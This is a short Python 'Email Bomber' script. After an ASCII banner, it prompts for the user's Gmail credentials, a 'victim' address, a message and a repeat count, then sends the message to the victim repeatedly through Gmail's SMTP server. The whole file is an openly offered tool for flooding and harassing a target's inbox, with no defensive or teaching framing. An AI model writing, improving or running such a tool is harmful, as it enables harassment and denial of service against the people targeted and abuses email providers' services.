import smtplib
import time

print("""  
+----------------------------------------------------------------------------------------------------------------+
|▀███▀▀▀███                          ██  ▀███     ▀███▀▀▀██▄                          ▄██                        |
| ██    ▀█                                 ██       ██    ██                           ██                        |
| ██   █  ▀████████▄█████▄  ▄█▀██▄ ▀███    ██       ██    ██ ▄██▀██▄▀████████▄█████▄   ██▄████▄   ▄▄█▀██▀███▄███ |
| ██████    ██    ██    ██ ██   ██   ██    ██       ██▀▀▀█▄▄██▀   ▀██ ██    ██    ██   ██    ▀██ ▄█▀   ██ ██▀ ▀▀ |
| ██   █  ▄ ██    ██    ██  ▄█████   ██    ██       ██    ▀███     ██ ██    ██    ██   ██     ██ ██▀▀▀▀▀▀ ██     |
| ██     ▄█ ██    ██    ██ ██   ██   ██    ██       ██    ▄███▄   ▄██ ██    ██    ██   ██▄   ▄██ ██▄    ▄ ██     |
|▄██████████████  ████  ████▄████▀██▄████▄▄████▄   ▄████████  ▀█████▀▄████  ████  ████▄ █▀█████▀   ▀█████▀████▄  |                     
+----------------------------------------------------------------------------------------------------------------+
By dsxz19-2
Copywrite dsxz19-2

For this to work you need to allow less secure apps to send emails: https://bit.ly/3yn1d9v
""")
sender_email = input(str("[+] Enter your email here: "))
victim_email = input(str("[+] Enter victim email here: "))
password = input(str("[+] Enter your email password here: "))
message = input(str("[+] Enter your message here: "))
loop = int(input("[+] How many emails would you like to send: "))
sleep = int(input("[+] Enter time between each email: "))


server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()

count = 1

for i in range (loop):
	try:
		server.login(sender_email, password)
	except:
		print("[-] An error has occured, recheck your email, victem's email and password for typos.")
		break
	server.sendmail(sender_email, victim_email, message)
	print(count, " Done email sent to", victim_email)
	count = count + 1
	time.sleep(sleep)
print("[+] Done \n Exitting...")
